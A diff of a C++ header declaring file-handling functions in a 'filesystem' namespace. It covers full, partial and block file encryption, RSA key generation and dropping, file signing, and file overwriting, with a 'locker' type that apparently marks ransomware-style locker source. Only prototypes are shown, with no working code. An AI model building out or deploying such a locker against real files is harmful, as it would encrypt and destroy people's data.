@@ -10,7 +10,8 @@
 namespace filesystem
 {
 	BOOL getParseFile(PFILE_INFO FileInfo);
-	BOOL CreateFileOpen(PFILE_INFO FileInfo);
+	BOOL CreateFileOpen(PFILE_INFO FileInfo, DWORD state_const);
+	BOOL ReadRSAFile(CRYPT_INFO* CryptInfo);
 	BOOL EncryptFileFullData(PFILE_INFO FileInfo);
 	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
 	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
@@ -19,13 +20,14 @@ namespace filesystem
 	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
 	BOOL ReadFile_(PFILE_INFO FileInfo);
 	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
-	BOOL EncryptRSA(PFILE_INFO FileInfo, WCHAR* KeyFile);
-	BOOL FileCryptEncrypt(PFILE_INFO FileInfo, WCHAR* KeyFile);
-	BOOL FileCryptDecrypt(PFILE_INFO FileInfo, WCHAR* KeyFile);
-	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, PFILE_INFO FileInfo);
+	BOOL HandlerGenKeyPairRSA();
+	BOOL EncryptRSA(PFILE_INFO FileInfo);
+	BOOL FileCryptEncrypt(PFILE_INFO FileInfo);
+	BOOL FileCryptDecrypt(PFILE_INFO FileInfo);
+	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, HANDLE HandleHash);
 	VOID sort_hash_list(SLIST<HASH_LIST>* list);
-	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
-	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
+	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList);
+	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
 	VOID RootKeySignatureTrust(VOID);
 	BOOL OverWriteFile(PFILE_INFO FileInfo);
 }
